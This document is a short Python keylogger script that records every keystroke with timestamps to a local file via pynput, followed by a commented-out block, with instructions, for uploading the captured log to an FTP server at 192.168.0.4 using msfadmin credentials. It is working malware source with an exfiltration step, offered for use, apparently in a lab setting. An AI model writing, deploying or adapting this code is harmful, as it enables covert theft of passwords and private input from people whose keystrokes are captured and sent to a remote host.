from pynput.keyboard import Key,Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))


def releasing_key(key):
    if key== Key.esc:
        return False
print("\nStarted listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

'''
if you want to send your key logger file to any if using ftp server you can use this below code in place of 192.168.0.4 replace it with your own
ip address

print("\n connecting to the ftp and sending the data....")


sess = ftplib.FTP("192.168.0.4","msfadmin","msfadmin")
file = open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt",file)
file.close()
sess.quit()
'''
